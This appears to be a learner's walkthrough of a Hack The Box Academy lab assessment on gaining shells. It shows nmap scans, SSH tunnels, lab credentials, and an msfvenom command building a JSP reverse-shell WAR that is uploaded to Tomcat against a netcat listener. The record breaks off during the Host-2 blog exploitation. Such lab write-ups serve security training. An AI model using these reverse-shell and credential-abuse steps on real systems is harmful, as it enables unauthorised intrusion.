# Skills Assessment

### Scenario:

CAT5's team has secured a foothold into Inlanefrieght's network for us. Our responsibility is to examine the results from the recon that was run, validate any info we deem necessary, research what can be seen, and choose which exploit, payloads, and shells will be used to control the targets. Once on the VPN or from your `Pwnbox`, we will need to `RDP` into the foothold host and perform any required actions from there. Below you will find any credentials, IP addresses, and other info that may be required.

***

### Objectives:

* Demonstrate your knowledge of exploiting and receiving an interactive shell from a `Windows host or server`.
* Demonstrate your knowledge of exploiting and receiving an interactive shell from a `Linux host or server`.
* Demonstrate your knowledge of exploiting and receiving an interactive shell from a `Web application`.
* Demonstrate your ability to identify the `shell environment` you have access to as a user on the victim host.

Complete the objectives by answering the challenge questions `below`.

### Credentials and Other Needed Info:

Foothold:

* IP:
* Credentials: `htb-student` / HTB\_@cademy\_stdnt! Can be used by RDP.

***

### Connectivity To The Foothold

`Connection Instructions`:\
Accessing the Skills Assessment lab environment will require the use of [XfreeRDP](https://manpages.ubuntu.com/manpages/trusty/man1/xfreerdp.1.html) to provide GUI access to the virtual machine. We will be connecting to the Academy lab like normal utilizing your own VM with a HTB Academy `VPN key` or the `Pwnbox` built into the module section. You can start the `FreeRDP` client on the Pwnbox by typing the following into your shell once the target spawns:

```bash
xfreerdp /v:<target IP> /u:htb-student /p:HTB_@cademy_stdnt!
```

You can find the `target IP`, `Username`, and `Password` needed below:

* Click below in the Questions section to spawn the target host and obtain an IP address.
  * `IP` ==
  * `Username` == htb-student
  * `Password` == HTB\_@cademy\_stdnt!

Once you initiate the connection, you will be required to enter the provided credentials again in the window you see below:

#### **XFreeRDP Login**

![Login screen for FreeRDP with fields for session, username, and password.](https://academy.hackthebox.com/storage/modules/115/xfree-login.png)

Enter your credentials again and click `OK` and you will be connected to the provided Parrot Linux desktop instance.

![Network diagram with three hosts: Host-01 at 172.16.1.11:8080, Host-02 at blog.inlanefreight.local, Host-03 at 172.16.1.13, and a foothold labeled 'See target spawn'.](https://academy.hackthebox.com/storage/modules/115/challenge-map.png)

Hosts 1-3 will be your targets for this skills challenge. Each host has a unique vector to attack and may even have more than one route built-in. The challenge questions below can be answered by exploiting these three hosts. Gain access and enumerate these targets. You will need to utilize the Foothold PC provided. The IP will appear when you spawn the targets. Attempting to interact with the targets from anywhere other than the foothold will not work. Keep in mind that the Foothold host has access to the Internal inlanefreight network (`172.16.0.0/23` network) so you may want to pay careful attention to the IP address you pick when starting your listeners.

***

* What is the hostname of Host-1? (Format: all lower case)

First, connect via RDP to the machine on scoop

```
xfreerdp /v:10.129.204.126 /u:htb-student /p:HTB_@cademy_stdnt! /clipboard
```

Once do that, we can see the etc hosts for locate other hosts -->

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

With it, i run a nmap to 172.16.1.11 to detect ports -->

```
ports=$(nmap -p- --min-rate=1000 -T4 status.inlanefreight.local | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV status.inlanefreight.local
 
[redacted]
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 128 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Inlanefreight Server Status
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack ttl 128 Windows Server 2019 Standard 17763 microsoft-ds
515/tcp   open  printer       syn-ack ttl 128
1801/tcp  open  msmq?         syn-ack ttl 128
2103/tcp  open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
2105/tcp  open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
2107/tcp  open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
3387/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
3389/tcp  open  ms-wbt-server syn-ack ttl 128 Microsoft Terminal Services
|_ssl-date: 2025-06-17T10:27:24+00:00; -2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SHELLS-WINSVR
|   NetBIOS_Domain_Name: SHELLS-WINSVR
|   NetBIOS_Computer_Name: SHELLS-WINSVR
|   DNS_Domain_Name: shells-winsvr
|   DNS_Computer_Name: shells-winsvr
|   Product_Version: 10.0.17763
|_  System_Time: 2025-06-17T10:27:19+00:00
| ssl-cert: Subject: commonName=shells-winsvr
| Issuer: commonName=shells-winsvr
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-16T10:14:02
| Not valid after:  2025-12-16T10:14:02
| MD5:   7b92 29a2 dd14 51e1 fca7 e853 1201 0e9d
| SHA-1: d0c0 b523 3e8a 0812 a1c9 6c4d fd4d 8f68 6cb2 6c7e
| -----BEGIN CERTIFICATE-----
| MIIC3jCCAcagAwIBAgIQZwO0XosrYqdMObmQMuImMzANBgkqhkiG9w0BAQsFADAY
| MRYwFAYDVQQDEw1zaGVsbHMtd2luc3ZyMB4XDTI1MDYxNjEwMTQwMloXDTI1MTIx
| NjEwMTQwMlowGDEWMBQGA1UEAxMNc2hlbGxzLXdpbnN2cjCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAMHd87RT8X+tLkXkGR7yI4g5cZezRIyupIM4dKdF
| QJ7yB8I5uKNewCepUbdKDeeoaOyv5KuVU/IaqFk+yNiFfTECauFDHZpei5zJigy5
| E4/1YXCTCrbUzaEIO3Lz69o74xm6abJ+aMgajIl5Vm8Lm0SGIVM/QDbjOAxcKwiO
| npiDhScJxZXwlQAsITVT6TwY8ayTRSq7LX0eZm5meS9SfR5UIxbtisM8hUjjhWi3
| sIA1EFa23/kW5b16oakRK4ipXyelJTETb8HST3PbU4kBLaLKmVDRKZdbNnPKwRXO
| WuD4qZ0uZmO5n6F2RLHjQxw6HyKi0WGwctZe5+hyZZuozh0CAwEAAaMkMCIwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IB
| AQBsGZ9DG064lc7V1oq7QkeLLjQs5LgvwA4HfN06ic+HvBQdeo1HimiewidMioHY
| Cm+JpxZuQJNoM47c5iXcm+p72DfZgWtcWHzdcfDNVnU2juwbnR/qFDznnkseiX6G
| 2yZ9Ij3ad0vEft5rHJgOQpZ1/jkKuysz7RZ+oCRyxq0ROI4a+pEYajWR/hB65vnk
| INqssXS8xa7BezgAC4KRn6tEP8gpsAOqxGRIEYmmt7ve8qoJ7lhaDsVOy/fZtby+
| iM5Kc5a/9GainGdMPE1vedWdVj/Frn8GSEtvzw2qfi7qPvGRoQvnYyKo2JzZw0zN
| ihkBHH2/tAkSqKroljOC0ihZ
|_-----END CERTIFICATE-----
5504/tcp  open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
5985/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http          syn-ack ttl 128 Apache Tomcat 10.0.11
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/10.0.11
|_http-favicon: Apache Tomcat
47001/tcp open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
MAC Address: 00:50:56:B0:7C:99 (VMware)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
 
Host script results:
| smb2-time: 
|   date: 2025-06-17T10:27:19
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: SHELLS-WINSVR, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:7c:99 (VMware)
| Names:
|   SHELLS-WINSVR<00>    Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   SHELLS-WINSVR<20>    Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   00 50 56 b0 7c 99 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: shells-winsvr
|   NetBIOS computer name: SHELLS-WINSVR\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-06-17T03:27:18-07:00
|_clock-skew: mean: 1h23m57s, deviation: 3h07m49s, median: -3s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 58510/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 12248/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 46870/udp): CLEAN (Timeout)
|   Check 4 (port 28715/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

Here we can see it

* Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case)

This deskto that we connect, it havent firefox or other navegator, so... we need weak up ssh server and do a ssh tunneling -->

<pre><code><strong>## In machine RDP
</strong><strong>systemctl start ssh
</strong>## In our machine
ssh -L 9999:172.16.1.11:8080 htb-student@10.129.204.126
</code></pre>

<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

> Note: _This host has two upload vulnerabilities. If you look at status.inlanefreight.local or browse to the IP on port 8080, you will see the vector. When messing with one of them, the creds ” tomcat | Tomcatadm ” may come in handy._

Now create the revershell -->

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=443 -f war > shell.war
```

And connect via ssh to 10.129.204.126 to weak up the nc in 666

```
┌─[✗]─[htb-student@skills-foothold]─[~]
└──╼ $sudo nc -nlvp 443
[sudo] password for htb-student: 
listening on [any] 443 ...
```

Now, upload the file and target him -->

<figure><img src="../../../.gitbook/assets/image (12) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And cd C:\Shares\\

* What distribution of Linux is running on Host-2? (Format: distro name, all lower case)

Go away to us linux machine provided and execute nmap

```
nmap -A 172.16.1.12
```

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* What language is the shell written in that gets uploaded when using the 50064.rb exploit?

> Hint : Have you taken the time to validate the scan results? Did you browse to the webpage being hosted? blog.inlanefreight.local looks like a nice space for team members to chat. If you need the credentials for the blog, “ admin:admin123!@# “ have been given out to all members to edit their posts. At least, that’s what our recon showed.

`Login admin:admin123!@#`&#x20;

php

* Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt

Do again ssh tunneling to the website of this host -->

```
ssh -L 1234:172.16.1.12:80 htb-student@10.129.204.126
```

<figure><img src="../../../.gitbook/assets/image (14) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

But! he is blind, so... connect via RDP to the linux machine provided and execute msfconsole -->

